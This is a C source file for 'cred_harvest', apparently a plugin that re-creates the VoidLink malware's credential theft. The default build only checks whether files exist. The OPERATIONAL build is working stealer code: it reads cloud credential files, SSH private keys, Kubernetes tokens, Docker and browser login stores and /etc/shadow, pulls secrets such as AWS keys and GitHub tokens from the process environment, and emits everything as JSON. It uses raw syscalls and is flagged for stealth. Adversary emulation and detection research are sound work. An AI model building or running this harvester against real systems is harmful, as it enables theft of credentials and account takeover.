/*
 * de-voidlink Arsenal Plugin: cred_harvest
 *
 * BENIGN (default): Enumerates credential storage locations, checks existence only.
 * OPERATIONAL (-DOPERATIONAL): Opens and reads credential file contents,
 *   extracts env var secrets from /proc/self/environ.
 *
 * All I/O via direct syscalls. No libc. Freestanding.
 */

#include "plugin_api.h"

/* Syscall numbers (x86_64) */
#define SYS_newfstatat  262
#define SYS_openat      257
#define SYS_read        0
#define SYS_close       3
#define SYS_write       1

#define VL_AT_FDCWD (-100)
#define O_RDONLY    0
#define O_PATH      0x200000

/* Credential paths that VoidLink targets (from Ontinue report) */
static const char *cred_paths[] = {
    /* AWS */
    "/root/.aws/credentials",
    "/root/.aws/config",
    /* GCP */
    "/root/.config/gcloud/application_default_credentials.json",
    /* Azure */
    "/root/.azure/accessTokens.json",
    /* SSH */
    "/root/.ssh/id_rsa",
    "/root/.ssh/id_ed25519",
    "/root/.ssh/authorized_keys",
    "/root/.ssh/known_hosts",
    /* Git */
    "/root/.git-credentials",
    "/root/.gitconfig",
    /* Shell history */
    "/root/.bash_history",
    "/root/.zsh_history",
    "/root/.python_history",
    /* K8s */
    "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
    "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
    /* Docker */
    "/root/.docker/config.json",
    /* Browser (Chromium) */
    "/root/.config/chromium/Default/Login Data",
    "/root/.config/google-chrome/Default/Login Data",
    /* Misc */
    "/etc/shadow",
    "/etc/passwd",
};

#define NUM_CRED_PATHS (sizeof(cred_paths) / sizeof(cred_paths[0]))

static PluginInfo info = {
    .name = "cred_harvest",
#ifdef OPERATIONAL
    .version = "2.0.0",
    .description = "Credential extraction — reads credential files and environment secrets",
#else
    .version = "1.0.0",
    .description = "Credential path enumeration — checks existence of known credential locations",
#endif
    .author = "de-voidlink",
    .api_version = PLUGIN_API_VERSION,
    .capabilities = PLUGIN_CAP_FILESYSTEM | PLUGIN_CAP_STEALTH,
};

PluginInfo* plugin_info(void) {
    return &info;
}

int plugin_init(PluginContext *ctx) {
    (void)ctx;
    return PLUGIN_OK;
}

/* Helper: manual string length (used by operational code only) */
#ifdef OPERATIONAL
static size_t vl_strlen(const char *s) {
    size_t len = 0;
    while (s[len]) len++;
    return len;
}
#endif

/* Helper: format uint to decimal (used in both modes) */
static int fmt_uint(char *buf, unsigned long val) {
    char tmp[20];
    int i = 0;
    if (val == 0) { buf[0] = '0'; return 1; }
    while (val > 0) { tmp[i++] = '0' + (char)(val % 10); val /= 10; }
    for (int j = 0; j < i; j++) buf[j] = tmp[i - 1 - j];
    return i;
}

#ifdef OPERATIONAL

/* Helper: output JSON-safe string */
static void output_json_str(PluginContext *ctx, const char *s, size_t len) {
    for (size_t i = 0; i < len; i++) {
        char c = s[i];
        if (c == '"' || c == '\\') { OUTPUT_WRITE(ctx, "\\", 1); }
        if (c == '\n') { OUTPUT_WRITE(ctx, "\\n", 2); }
        else if (c == '\r') { OUTPUT_WRITE(ctx, "\\r", 2); }
        else if (c == '\t') { OUTPUT_WRITE(ctx, "\\t", 2); }
        else if (c == 0) { break; }
        else if (c >= 32 && c < 127) { OUTPUT_WRITE(ctx, &c, 1); }
        else {
            /* Non-printable: output as \xHH */
            char hex[4] = {'\\', 'x', 0, 0};
            unsigned char uc = (unsigned char)c;
            hex[2] = (uc >> 4) < 10 ? '0' + (char)(uc >> 4) : 'a' + (char)((uc >> 4) - 10);
            hex[3] = (uc & 0xf) < 10 ? '0' + (char)(uc & 0xf) : 'a' + (char)((uc & 0xf) - 10);
            OUTPUT_WRITE(ctx, hex, 4);
        }
    }
}

/* Read file and output its contents as JSON string */
static long read_and_output(PluginContext *ctx, const char *path, long fd) {
    char buf[4096];
    long total = 0;

    /* Re-open for reading (fd was opened with O_PATH, can't read) */
    ctx->syscalls->syscall1(SYS_close, fd);
    long rfd = ctx->syscalls->syscall4(SYS_openat, (long)VL_AT_FDCWD, (long)path, O_RDONLY, 0);
    if (rfd < 0) return -1;

    while ((size_t)total < sizeof(buf) - 1) {
        long n = ctx->syscalls->syscall3(SYS_read, rfd, (long)(buf + total), (long)(sizeof(buf) - 1 - (size_t)total));
        if (n <= 0) break;
        total += n;
    }
    ctx->syscalls->syscall1(SYS_close, rfd);

    if (total > 0) {
        OUTPUT_STRING(ctx, ",\"content\":\"");
        output_json_str(ctx, buf, (size_t)total);
        OUTPUT_STRING(ctx, "\"");
    }

    OUTPUT_STRING(ctx, ",\"size\":");
    char nbuf[20];
    int nlen = fmt_uint(nbuf, (unsigned long)total);
    OUTPUT_WRITE(ctx, nbuf, (size_t)nlen);

    return total;
}

/* Extract environment secrets from /proc/self/environ */
static void emit_env_secrets(PluginContext *ctx) {
    static const char *env_targets[] = {
        "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN", "AWS_ACCESS_KEY_ID",
        "GCP_SERVICE_ACCOUNT", "AZURE_CLIENT_SECRET", "AZURE_CLIENT_ID",
        "GITHUB_TOKEN", "GITLAB_TOKEN", "GITLAB_PRIVATE_TOKEN",
        "DATABASE_URL", "REDIS_URL", "MONGO_URI",
        "DOCKER_AUTH_CONFIG", "NPM_TOKEN", "PYPI_TOKEN",
    };
    #define NUM_ENV_SECRETS (sizeof(env_targets) / sizeof(env_targets[0]))

    if (!ctx->syscalls) {
        OUTPUT_STRING(ctx, "[]");
        return;
    }

    char buf[8192];
    long efd = ctx->syscalls->syscall4(SYS_openat, (long)VL_AT_FDCWD,
                                       (long)"/proc/self/environ", O_RDONLY, 0);
    if (efd < 0) {
        OUTPUT_STRING(ctx, "[]");
        return;
    }

    long total = 0;
    while ((size_t)total < sizeof(buf) - 1) {
        long n = ctx->syscalls->syscall3(SYS_read, efd, (long)(buf + total),
                                         (long)(sizeof(buf) - 1 - (size_t)total));
        if (n <= 0) break;
        total += n;
    }
    ctx->syscalls->syscall1(SYS_close, efd);

    OUTPUT_STRING(ctx, "[");
    int found = 0;
    char *p = buf;
    char *end = buf + total;

    while (p < end) {
        size_t elen = vl_strlen(p);
        if (elen == 0) { p++; continue; }

        for (unsigned int t = 0; t < NUM_ENV_SECRETS; t++) {
            size_t tlen = vl_strlen(env_targets[t]);
            int match = 1;
            if (elen <= tlen + 1) { match = 0; }
            else {
                for (size_t k = 0; k < tlen; k++) {
                    if (p[k] != env_targets[t][k]) { match = 0; break; }
                }
                if (match && p[tlen] != '=') match = 0;
            }
            if (match) {
                if (found > 0) OUTPUT_STRING(ctx, ",");
                OUTPUT_STRING(ctx, "{\"name\":\"");
                OUTPUT_WRITE(ctx, env_targets[t], tlen);
                OUTPUT_STRING(ctx, "\",\"value\":\"");
                char *val = p + tlen + 1;
                size_t vlen = elen - tlen - 1;
                output_json_str(ctx, val, vlen);
                OUTPUT_STRING(ctx, "\"}");
                found++;
                break;
            }
        }
        p += elen + 1;
    }
    OUTPUT_STRING(ctx, "]");
}

#endif /* OPERATIONAL */

int plugin_exec(PluginContext *ctx) {
    if (ctx->mode == EXEC_MODE_DRY_RUN) {
        OUTPUT_STRING(ctx, "{\"plugin\":\"cred_harvest\",\"mode\":\"dry_run\",\"paths_checked\":0}\n");
        return PLUGIN_DRY_RUN;
    }

    OUTPUT_STRING(ctx, "{\"plugin\":\"cred_harvest\",\"paths\":[");

    unsigned int found = 0;
    unsigned int checked = 0;

    for (unsigned int i = 0; i < NUM_CRED_PATHS; i++) {
        checked++;

        /* Check existence via openat with O_PATH */
        long fd = -1;
        if (ctx->syscalls) {
            fd = ctx->syscalls->syscall4(SYS_openat, (long)VL_AT_FDCWD,
                                         (long)cred_paths[i], (long)O_PATH, 0);
        }

        int exists = (fd >= 0);

        if (exists) {
            if (found > 0) OUTPUT_STRING(ctx, ",");
            OUTPUT_STRING(ctx, "{\"path\":\"");
            OUTPUT_STRING(ctx, cred_paths[i]);
            OUTPUT_STRING(ctx, "\",\"exists\":true");

#ifdef OPERATIONAL
            /* Actually read the file contents */
            if (ctx->syscalls) {
                read_and_output(ctx, cred_paths[i], fd);
                fd = -1; /* read_and_output closed it */
            }
#endif

            OUTPUT_STRING(ctx, "}");
            found++;
        }

        if (fd >= 0 && ctx->syscalls) {
            ctx->syscalls->syscall1(SYS_close, fd);
        }
    }

    OUTPUT_STRING(ctx, "],\"total_checked\":");
    char num_buf[10];
    int nlen = fmt_uint(num_buf, checked);
    OUTPUT_WRITE(ctx, num_buf, (size_t)nlen);

    OUTPUT_STRING(ctx, ",\"found\":");
    nlen = fmt_uint(num_buf, found);
    OUTPUT_WRITE(ctx, num_buf, (size_t)nlen);

#ifdef OPERATIONAL
    OUTPUT_STRING(ctx, ",\"env_secrets\":");
    emit_env_secrets(ctx);
#endif

    OUTPUT_STRING(ctx, "}\n");
    return PLUGIN_OK;
}

int plugin_cleanup(PluginContext *ctx) {
    (void)ctx;
    return PLUGIN_OK;
}
